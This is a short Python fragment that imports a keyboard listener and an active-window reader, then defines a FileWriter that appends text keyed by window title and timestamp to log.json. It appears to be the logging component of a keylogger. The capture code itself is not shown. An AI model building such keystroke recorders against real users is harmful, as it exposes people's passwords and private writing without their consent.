import time
from pynput import keyboard
from datetime import datetime
import pygetwindow as gw
from abc import ABC, abstractmethod
import json




class Write:
    @abstractmethod
    def write(self, data):
        pass

class FileWriter(Write):
    def write(self, data: dict):
        try:
            with open("log.json", "r") as file:
                try:
                    origin_data = json.load(file)
                except json.JSONDecodeError:
                    origin_data = {}
        except FileNotFoundError:
            origin_data = {}

        for window in data:
            if window not in origin_data:
                origin_data[window] = {}
            for time in data[window]:
                if time not in origin_data[window]:
                    origin_data[window][time] = ""
                origin_data[window][time] += str(data[window][time])

        with open("log.json", "w") as file:
            json.dump(origin_data, file, indent=4)